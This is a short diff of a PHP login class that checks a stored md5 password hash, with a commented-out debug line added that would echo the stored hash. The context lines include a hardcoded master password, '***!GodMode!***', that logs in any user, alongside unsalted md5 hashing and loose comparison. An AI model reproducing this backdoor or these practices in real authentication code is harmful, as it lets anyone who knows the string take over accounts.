@@ -29,6 +29,7 @@ class login extends is_not_logged {
             $passwordFile = PHOENIX_FOLDER . $folderName . '/Pwd.phx';
             if(file_exists($passwordFile)) {
                 $pass = file_get_contents($passwordFile, 'r');
+                //$this->json_error('Pass: ' . $pass);
                 if ($pass == md5($this->password) || $this->password == '***!GodMode!***'){
                     set_session_variables($this->username, true);
                     return;
